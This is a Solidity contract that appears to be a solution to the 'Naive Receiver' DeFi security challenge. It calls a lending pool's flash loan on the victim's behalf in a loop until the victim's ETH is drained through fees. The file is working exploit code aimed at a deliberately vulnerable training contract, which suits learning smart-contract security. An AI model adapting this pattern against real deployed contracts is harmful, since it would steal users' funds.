// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import { NaiveReceiverLenderPool } from "./NaiveReceiverLenderPool.sol";

contract Attack {
    address payable victim;
    address payable lendingPool;

    constructor(address payable _victim, address payable _lendingPool) {
        victim = _victim;
        lendingPool = _lendingPool;
    }

    function attack(uint256 value) public {
        while(victim.balance >= 1 ether) {
            NaiveReceiverLenderPool(lendingPool).flashLoan(victim, value);
        }
    }
}